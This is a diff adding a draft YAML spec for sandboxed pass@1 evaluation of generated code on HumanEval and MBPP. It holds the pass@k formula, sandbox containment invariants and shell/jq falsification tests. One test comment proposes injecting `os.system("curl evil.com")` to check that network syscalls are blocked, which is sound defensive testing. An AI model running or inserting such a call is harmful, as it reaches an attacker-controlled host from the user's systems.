@@ -1,0 +1,135 @@
+# CRUX-E-01 — pass@1 HumanEval/MBPP sandboxed
+# Auto-scaffolded from crux-competitive-research-ux-v1.yaml (DRAFT).
+# DO NOT promote to ACTIVE until: (1) evidence collected, (2) falsification
+# body reflects competitor's canonical CLI, (3) apr surface mapped or gap
+# tracked in pmat work (see master §12).
+
+metadata:
+  id: CRUX-E-01
+  version: "1.0.0-draft"
+  created: "2026-04-18"
+  author: PAIML Engineering
+  registry: true
+  status: draft
+  parent_contracts:
+  - crux-competitive-research-ux-v1
+  category: "E — Training & Fine-tuning"
+  competitor: huggingface
+  demand_score: 5  # 1..5, critical priority in pmat work
+  intake_status: partial
+  description: >
+    pass@1 HumanEval/MBPP sandboxed. Competitor: bigcode-evaluation-harness
+    which executes generated code under docker/firejail sandbox and emits
+    pass@k metrics. Aprender surface: `apr eval model.apr --task humaneval
+    --sandbox firejail --k 1 --json`. Reference baseline: Llama-3-8B-Instruct
+    HumanEval pass@1 ≈ 0.62.
+    Source: https://github.com/bigcode-project/bigcode-evaluation-harness
+
+  references:
+  - 'master: contracts/crux-competitive-research-ux-v1.yaml — §5 + §12'
+  - github.com/EleutherAI/lm-evaluation-harness
+  - github.com/openai/human-eval
+  - github.com/mlfoundations/open_clip
+equations:
+  pass_at_k:
+    formula: |
+      pass@k = E_problems [ 1 - C(n-c, k) / C(n, k) ]
+      where:
+        n = number of samples generated per problem (>= k)
+        c = number of correct samples out of n
+        C(a, b) = binomial coefficient "a choose b"
+      For k=1 with deterministic decoding (temp=0, seed fixed):
+        pass@1 = (#solved problems) / (#total problems)
+    domain: (n, c, k) ∈ ℕ³ with n >= k and c <= n
+    codomain: 0.0; 1.0
+    invariants:
+    - "pass@1 ∈ [0.0, 1.0]"
+    - "pass@k monotonically non-decreasing in k (for fixed n, c)"
+    - "If temp=0.0 and seed fixed, pass@1 is deterministic (reproducible)"
+    - "total_problems matches task registry (HumanEval=164, MBPP=974)"
+
+  sandbox_containment:
+    formula: |
+      For every generated code sample s:
+        execute(s) runs inside sandbox S
+        S prevents: network access, filesystem write outside tmpfs,
+                    process escape (ptrace), syscalls outside allowlist
+      No sample's execution trace escapes S.
+    domain: generated code samples
+    codomain: 'contained: None, escaped: None'
+    invariants:
+    - "Network syscalls (connect, bind) are blocked by seccomp"
+    - "Filesystem writes confined to tmpfs mount"
+    - "No child process survives sandbox teardown"
+
+falsification_tests:
+- id: FALSIFY-CRUX-E-01-001
+  rule: JSON schema contains required pass@k fields
+  prediction: "apr eval --json output has pass_at_1, pass_at_10, total_problems, task_id"
+  test: |
+    apr eval model.apr --task humaneval --sandbox firejail --k 1,10 --json > out.json
+    jq -e '.pass_at_1 and .pass_at_10 and .total_problems and .task_id' out.json
+  if_fails: "JSON output missing required pass@k fields"
+
+- id: FALSIFY-CRUX-E-01-002
+  rule: pass@1 in valid range
+  prediction: "pass_at_1 ∈ [0.0, 1.0]"
+  test: |
+    apr eval model.apr --task humaneval --sandbox firejail --k 1 --json | \
+      jq -e '.pass_at_1 >= 0.0 and .pass_at_1 <= 1.0'
+  if_fails: "pass_at_1 outside [0.0, 1.0]"
+
+- id: FALSIFY-CRUX-E-01-003
+  rule: sandbox prevents escape
+  prediction: "No generated sample executes outside firejail sandbox"
+  test: |
+    # TODO: inject an adversarial sample that attempts `os.system("curl evil.com")`
+    # and verify the network syscall is blocked via seccomp audit log.
+    apr eval model.apr --task humaneval --sandbox firejail --audit-seccomp --json > out.json
+    jq -e '.seccomp_violations == 0 and .network_calls_blocked >= 0' out.json
+  if_fails: "Generated code executed outside sandbox (security regression)"
+
+- id: FALSIFY-CRUX-E-01-004
+  rule: reproducibility at temp=0 seed=42
+  prediction: "Two runs with temp=0.0 seed=42 produce identical pass_at_1"
+  test: |
+    P1=$(apr eval model.apr --task humaneval --sandbox firejail --k 1 \
+         --temperature 0.0 --seed 42 --json | jq '.pass_at_1')
+    P2=$(apr eval model.apr --task humaneval --sandbox firejail --k 1 \
+         --temperature 0.0 --seed 42 --json | jq '.pass_at_1')
+    [ "$P1" = "$P2" ]
+  if_fails: "Non-determinism at temp=0.0 seed=42 (reproducibility broken)"
+
+- id: FALSIFY-CRUX-E-01-005
+  rule: total_problems matches task registry
+  prediction: "HumanEval total_problems == 164; MBPP total_problems == 974"
+  test: |
+    HE=$(apr eval model.apr --task humaneval --sandbox firejail --k 1 --json | jq '.total_problems')
+    MB=$(apr eval model.apr --task mbpp --sandbox firejail --k 1 --json | jq '.total_problems')
+    [ "$HE" -eq 164 ] && [ "$MB" -eq 974 ]
+  if_fails: "Task registry mismatch — loader skipping or duplicating problems"
+
+proof_obligations:
+- type: invariant
+  property: "pass_at_1 ∈ [0.0, 1.0]"
+- type: invariant
+  property: "pass_at_k monotonically non-decreasing in k"
+- type: invariant
+  property: "All code execution contained in sandbox (no network/fs escape)"
+- type: invariant
+  property: "Reproducible at temp=0.0 with fixed seed"
+- type: invariant
+  property: "total_problems matches canonical task registry (HumanEval=164, MBPP=974)"
+
+verification_summary:
+  total_obligations: 5
+  proven: 0
+  tested: 0
+  status: spec-complete
+
+pmat_work_tracking:
+  # Managed by master contract §12. If intake_status == "missing", a ticket
+  # tagged `crux-crux-e-01` is auto-created by scripts/crux_bulk_pmat_work.sh.
+  ticket_tag: crux-crux-e-01
+  priority: critical
+  auto_created: false
